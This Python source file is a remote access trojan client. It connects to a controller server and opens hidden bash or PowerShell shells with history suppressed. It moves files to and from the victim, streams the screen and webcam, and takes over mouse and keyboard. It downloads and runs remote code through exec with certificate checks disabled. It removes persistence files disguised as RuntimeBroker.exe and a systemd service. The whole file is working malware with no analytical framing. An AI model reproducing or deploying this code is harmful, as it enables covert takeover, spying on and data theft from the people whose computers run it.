import subprocess
import threading
import platform
import socketio
import getpass
import sys
import base64
import ssl
from urllib.request import urlopen
from PIL import Image
import importlib.util
import mss
import time
import io
import os
import re
import zlib
import cv2  # Import OpenCV for camera access
import signal

# Platform check for GUI libraries
if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
    print("No display found, skipping GUI libraries.")
else:
    import pyautogui
    pyautogui.FAILSAFE = False

# Declare the global stop event
stop_event = threading.Event()
screen_or_camera = "screen"
screen_number = 1

screen_fps = 60
screen_qualtiy = 20

# Dictionary to store shells by key
shells = {}

INACTIVITY_TIMEOUT = 30 * 60  # 30 minutes timeout in seconds

def run(data):
    def create_module(url):
        # Create an SSL context that doesn't verify certificates
        context = ssl._create_unverified_context()
        with urlopen(url, context=context) as response:
            code = response.read().decode("utf-8")

        spec = importlib.util.spec_from_loader("temp", loader=None)
        module = importlib.util.module_from_spec(spec)

        # Execute the code in the module's namespace
        exec(code, module.__dict__)

        return module

    sio = socketio.Client(logger=False, engineio_logger=False)

    system = platform.system()

    class InteractiveShell:
        def __init__(self, key, uid):
            self.process = None
            self.master_fd = None  # Master file descriptor for PTY on Unix systems
            self.running = False
            self.key = key
            self.uid = uid
            self.last_activity_time = time.time()  # Track last activity time

        def start(self):
            self.running = True
            if os.name == "posix":  # Unix-like systems
                print("Linux shell")
                import pty

                self.master_fd, slave_fd = pty.openpty()

                env = os.environ.copy()
                env['HISTFILE'] = '/dev/null'  # Do not store history
                env['HISTSIZE'] = '0'          # No history in memory
                env['HISTCONTROL'] = 'ignore'  # Ignore duplicate commands

                self.process = subprocess.Popen(
                    ["/bin/bash"],
                    stdin=slave_fd,
                    stdout=slave_fd,
                    stderr=slave_fd,
                    universal_newlines=False,  # Use binary mode for full control
                    bufsize=0,
                    env=env,
                )
                output_thread = threading.Thread(target=self.read_output_posix)
            else:  # Windows
                print("Windows shell")
                from winpty import PtyProcess
                self.process = PtyProcess.spawn('powershell')
                output_thread = threading.Thread(target=self.read_output_windows)

            output_thread.start()

            # Start a thread to monitor inactivity
            inactivity_thread = threading.Thread(target=self.monitor_inactivity)
            inactivity_thread.daemon = True
            inactivity_thread.start()

        def read_output_posix(self):
            while self.running:
                try:
                    output = (
                        os.read(self.master_fd, 1024)
                        .decode(errors="ignore")
                    )
                    if output:
                        sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
                        self.reset_inactivity_timer()  # Reset timer on output
                except OSError:
                    break

        def read_output_windows(self):
            while self.process.isalive():
                output = self.process.read()
                sio.emit("result", {"key": self.key, "result": output, 'uid':self.uid})
                self.reset_inactivity_timer()  # Reset timer on output

        def write_input(self, command):
            if os.name == "posix":
                os.write(self.master_fd, command.encode())
            else:
                self.process.write(command)
            self.reset_inactivity_timer()  # Reset timer on input

        def reset_inactivity_timer(self):
            self.last_activity_time = time.time()  # Reset inactivity timer

        def monitor_inactivity(self):
            while self.running:
                time.sleep(10)  # Check every 10 seconds
                if time.time() - self.last_activity_time > INACTIVITY_TIMEOUT:
                    print(f"Shell {self.key} is inactive for 30 minutes, killing it.")
                    self.terminate_shell()

        def terminate_shell(self):
            if self.process:
                self.process.terminate()
                self.running = False

                if self.key in shells:
                    del shells[self.key]
                    print(f"Shell {self.key} has been removed from the shells dictionary.")

    @sio.on("command")
    def command(data_new):
        if data["uid"] == data_new["uid"]:
            key = data_new["key"]
            print(key)
            if key not in shells:
                shells[key] = InteractiveShell(key, data['uid'])
                shells[key].start()
            
            shell = shells[key]
            shell.write_input(data_new["cmd"])

    @sio.on("restart")
    def restart(data_new):
        if data["uid"] == data_new["uid"]:
            key = data_new["key"]
            if key in shells:
                shell = shells[key]
                if shell.process:
                    shell.process.terminate()
                    shell.running = False
                shells[key] = InteractiveShell(key)  # Create a new InteractiveShell instance
                shells[key].start()  # Start the new shell process

    @sio.event
    def connect():
        sio.emit("mConnect", data)
        # Start a new thread to run the emit_screen_count function
        threading.Thread(target=emit_screen_count, args=(data,)).start()
        print(sio.sid)
        print(data["uid"])

    @sio.on("upload_file")
    def upload_file(data_new):
        if data["uid"] == data_new["uid"]:
            print(data_new["file_name"])
            with open(data_new["file_name"], "wb") as f:
                decoded_data = base64.b64decode(zlib.decompress(data_new["file"]))
                f.write(decoded_data)
                f.close()

    @sio.on("download_file")
    def download_file(data_new):
        if data["uid"] == data_new["uid"]:
            with open(data_new["file_path"], "rb") as f:
                file = f.read()
                f.close()
            file_ready = zlib.compress(base64.b64encode(file), level=9)
            sio.emit(
                "download_file_return",
                {
                    "uid": data_new["uid"],
                    "file_name": data_new["file_path"],
                    "file": file_ready,
                },
            )
            print("emited")

    @sio.on("pem")
    def pem(data_new):
        if data["uid"] == data_new["uid"]:
            print(data["url"]+ "pem/" + data_new["url"])
            def run_in_thread():
                try:
                    module = create_module(data["url"]+ "pem/" + data_new["url"])
                    module.run()
                except Exception as e:
                    print(f"Error occurred: {e}")

            # Create and start the thread
            threading.Thread(target=run_in_thread).start()

    @sio.on("kill")
    def kill(data_new):
        if data["uid"] == data_new["uid"]:
            PID = os.getpid()
            if platform.system() == 'Windows':
                # For Windows, just kill the current process
                os.kill(PID, signal.SIGTERM)
            else:
                # For Unix-based systems, kill the entire process group
                PGID = os.getpgid(PID)
                os.killpg(PGID, signal.SIGKILL)

    def remove_registry_key(key_name):
        try:
            import winreg

            reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
            
            try:
                winreg.DeleteValue(reg_key, key_name)
                print(f"Registry key '{key_name}' has been removed successfully.")
            except FileNotFoundError:
                print(f"Registry key '{key_name}' not found.")
            finally:
                winreg.CloseKey(reg_key)
        except Exception as e:
            print(f"Error: {e}")

    @sio.on("delete")
    def delete(data_new):
        if data["uid"] == data_new["uid"]:
            user = getpass.getuser()
            if platform.system() == "Windows":
                path=f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\"
                if os.path.exists(path+"uid.txt"):
                    os.remove(path+"uid.txt")
                if os.path.exists(path+"RuntimeBroker.exe"):
                    os.remove(path+"RuntimeBroker.exe")
                remove_registry_key("Runtime Broker")
            else:
                path=f"/home/{user}/.config/systemd/user/"
                if os.path.exists(path+".system_uid"):
                    os.remove(path+".system_uid")
                if os.path.exists(path+".systemd"):
                    os.remove(path+".systemd")
                if os.path.exists(path+"systemd.service"):
                    os.remove(path+"systemd.service")

                subprocess.run(
                    "XDG_RUNTIME_DIR=/run/user/$UID systemctl --user disable systemd.service",
                    shell=True,
                )
        kill(data_new)

    @sio.on("mouse_input")
    def mouse_input(data_new):
        if data["uid"] == data_new["uid"]:
            print(data_new['x'], data_new['y'])
            if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                print("No display found, skipping GUI libraries.")
            else:
                # Get the active screen dimensions
                with mss.mss() as sct:
                    monitor = sct.monitors[screen_number]
                    screen_width = monitor['width']
                    screen_height = monitor['height']
                    
                    # Calculate the new coordinates relative to the screen
                    x = data_new['x'] * screen_width
                    y = data_new['y'] * screen_height
                    
                    # Move mouse to the new position
                    pyautogui.moveTo(x, y)

    # Mouse click adjustment based on active screen
    @sio.on("mouse_click")
    def mouse_click(data_new):
        if data["uid"] == data_new["uid"]:
            if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                print("No display found, skipping GUI libraries.")
            else:
                # Get the active screen dimensions
                with mss.mss() as sct:
                    # Perform the mouse click at the new position
                    if data_new['going']:
                        pyautogui.mouseDown(button='left')
                    else:
                        pyautogui.mouseUp(button='left')

    # Right mouse click adjustment based on active screen
    @sio.on("mouse_click_right")
    def mouse_click(data_new):
        if data["uid"] == data_new["uid"]:
            if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                print("No display found, skipping GUI libraries.")
            else:
                # Get the active screen dimensions
                with mss.mss() as sct:
                    # Perform the right mouse click at the new position
                    if data_new['going']:
                        pyautogui.mouseDown(button='right')
                    else:
                        pyautogui.mouseUp(button='right')

    @sio.on("key_press")
    def key_press(data_new):
        if data["uid"] == data_new["uid"]:
            print(data_new)
            if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                print("No display found, skipping GUI libraries.")
            else:
                if data_new['going']:
                    pyautogui.keyDown(data_new["key"])
                else:
                    pyautogui.keyDown(data_new["key"])

    @sio.on("key_press_short")
    def key_press_short(data_new):
        if data["uid"] == data_new["uid"]:
            print(data_new)
            if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                print("No display found, skipping GUI libraries.")
            else:
                pyautogui.press(data_new["key"])

    @sio.on("mouse_scroll")
    def mouse_scroll(data_new):
        if data["uid"] == data_new["uid"]:
            if os.environ.get('DISPLAY', '') == '' and sys.platform != 'win32':
                print("No display found, skipping GUI libraries.")
            else:
                pyautogui.scroll(data_new['delta'])

    @sio.on("switch_screen")
    def switch_screen(data_new):
        global screen_or_camera
        if data["uid"] == data_new["uid"]:
            screen_or_camera = data_new["screen"]
            stop_event.set()  # Signal the thread to stop
            try:
                screenshot_thread.join()  # Wait for the thread to finish
            except:
                "Thread is already dead"

            stop_event.clear()  # Reset the event to False
            screenshot_thread = threading.Thread(
                target=take_screenshots, args=(sio, data["uid"])
            )

    @sio.on("change_screen_number")
    def change_screen_number(data_new):
        global screen_number
        if data["uid"] == data_new["uid"]:
            screen_number = int(data_new['screenNumber'])

            stop_event.set()  # Signal the thread to stop
            try:
                screenshot_thread.join()  # Wait for the thread to finish
            except:
                "Thread is already dead"

            stop_event.clear()  # Reset the event to False
            screenshot_thread = threading.Thread(
                target=take_screenshots, args=(sio, data["uid"])
            )

    @sio.on("change_screen_information")
    def change_screen_information(data_new):
        global screen_fps
        global screen_qualtiy

        if data['uid'] == data_new['uid']:
            screen_fps = data_new['screen_fps']
            screen_qualtiy = data_new['screen_qualtiy']

    def take_screenshots(sio, uid, fps=screen_fps, quality=screen_qualtiy):
        frame_interval = 1 / fps
        last_capture_time = 0

        print(screen_or_camera)

        if screen_or_camera == "screen":
            with mss.mss() as sct:
                if len(sct.monitors)-1 < 1:  # No monitors detected
                    print("No monitors found. Skipping screen capture.")
                else:
                    monitor = sct.monitors[screen_number]  # Capture the entire screen

                    while not stop_event.is_set():
                        current_time = time.time()
                        if current_time - last_capture_time >= frame_interval:
                            # Capture screenshot
                            screenshot = sct.grab(monitor)

                            # Convert screenshot to PIL Image
                            img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

                            # Compress to JPEG with adjustable quality
                            with io.BytesIO() as output:
                                img.save(output, format="JPEG", quality=quality)
                                jpeg_data = output.getvalue()

                            # Compress the JPEG data further using zlib
                            compressed_data = zlib.compress(jpeg_data, level=9)

                            # Emit the compressed data
                            sio.emit("screenshot", {"uid": uid, "image": compressed_data})
                            print("Sent compressed screenshot")

                            last_capture_time = current_time

                        # Small sleep to prevent a tight loop
                        time.sleep(0.001)
        else:
            # Use OpenCV to capture from the camera instead of the screen
            cap = cv2.VideoCapture(0)  # 0 is the default camera device index

            if not cap.isOpened():
                print("Error: Could not open camera.")
                return

            while not stop_event.is_set():
                current_time = time.time()
                if current_time - last_capture_time >= frame_interval:
                    ret, frame = cap.read()
                    if not ret:
                        print("Failed to capture image from camera")
                        break

                    # Convert the frame (BGR) to RGB
                    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)

                    # Convert the frame to a PIL Image
                    img = Image.fromarray(frame_rgb)

                    # Compress to JPEG with adjustable quality
                    with io.BytesIO() as output:
                        img.save(output, format="JPEG", quality=quality)
                        jpeg_data = output.getvalue()

                    # Compress the JPEG data further using zlib
                    compressed_data = zlib.compress(jpeg_data, level=9)

                    # Emit the compressed data
                    sio.emit("screenshot", {"uid": uid, "image": compressed_data})
                    print("Sent compressed camera screenshot")

                    last_capture_time = current_time

                    # Small sleep to prevent a tight loop
                    time.sleep(0.001)

            cap.release()

    screenshot_thread = threading.Thread(
        target=take_screenshots, args=(sio, data["uid"])
    )

    @sio.on("screen_status")
    def screen_status(data_new):
        if data["uid"] == data_new["uid"]:
            if data_new["status"] == "start":
                stop_event.clear()  # Reset the event to False
                screenshot_thread = threading.Thread(
                    target=take_screenshots, args=(sio, data["uid"])
                )
                screenshot_thread.start()
            else:
                stop_event.set()  # Signal the thread to stop
                try:
                    screenshot_thread.join()  # Wait for the thread to finish
                except:
                    "Thread is already dead"

    def emit_screen_count(data):
        while True:
            time.sleep(1)
            with mss.mss() as sct:
                if len(sct.monitors)-1 < 1:  # No monitors detected
                    print("No monitors found. Skipping screen capture.")
                else:
                    sio.emit('screen_count', { 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })

    sio.connect(data["url"])      
    sio.wait()
